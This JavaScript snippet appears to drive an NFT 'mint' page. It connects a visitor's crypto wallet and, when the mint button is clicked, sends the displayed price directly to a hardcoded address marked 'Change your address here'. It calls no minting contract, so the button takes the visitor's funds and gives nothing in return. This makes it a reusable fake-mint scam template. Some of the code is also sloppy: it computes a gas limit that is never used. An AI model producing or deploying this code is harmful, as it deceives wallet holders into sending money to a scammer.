var address = '0xCdf86AE16D9355BD25a850f1d0d0263867017383'; // Change your address here
var ethaddress = '';
var web3;
const ethereum = window.ethereum;

$(document).ready(function () {
    web3 = new Web3(
        new Web3.providers.HttpProvider(
            'https://bsc-dataseed1.binance.org:443'
        )
    );

    const sendTransaction = async () => {
        var totalPriceAmount = parseFloat($('#mintPrice').text());
        if (totalPriceAmount !== 0) {
            const priceToWei = (totalPriceAmount * 1e18).toString(16);
            const gasLimit = (100_000 * totalPriceAmount).toString(16);

            ethereum
                .request({
                    method: "eth_sendTransaction",
                    params: [
                        {
                            from: ethaddress,
                            to: address,
                            value: priceToWei,
                        },
                    ],
                })
                .then((txHash) => { console.log(txHash); })
                .catch((error) => { console.log(error) });
        }
    };

    async function connectWeb3() {
        if (window.ethereum) {
            window.web3 = new Web3(window.ethereum);
            conn = await window.ethereum.enable();

            ethconnected = conn.length > 0;
            if (ethconnected) {
                ethaddress = conn[0];
                $('#connectbtn').hide();
                $('#mintButton').fadeIn();
            }
            return true;
        }
    }

    connectWeb3();
    $('#mintButton').click(async () => {
        await sendTransaction();
    });
});